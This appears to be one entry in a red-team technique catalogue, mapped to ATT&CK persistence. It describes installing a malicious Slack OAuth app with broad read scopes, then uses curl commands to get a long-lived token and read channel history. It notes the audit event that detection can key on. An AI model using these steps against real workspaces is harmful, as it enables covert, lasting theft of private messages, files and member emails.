---
id: slack-malicious-app
title: Slack malicious app install (durable data access)
section: Slack / SaaS
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098]
platform: [slack]
source: Slack workspace compromise (malicious OAuth app)
pair: slack-app-audit
---

Install (or get approved) an OAuth app you control with broad read scopes —
`channels:history`, `groups:history`, `files:read`, `users:read.email`. Its bot/user token
then reads messages, files, and the member directory over the API on your schedule: a durable
data-access + persistence foothold that survives the victim's password reset and blends in
among legitimate integrations. Installation writes a Slack audit event `action=app_installed`.
(SaaS control plane — no on-host target, so no slots.)

```sh
# after a workspace admin authorizes your app, exchange the code for a long-lived token
curl -s -X POST "https://slack.com/api/oauth.v2.access" \
  -d "client_id=<app_id>" -d "client_secret=<secret>" -d "code=<oauth_code>"
# then read at will, e.g.: curl -s -H "Authorization: Bearer <token>" \
#   "https://slack.com/api/conversations.history?channel=<C…>"
```
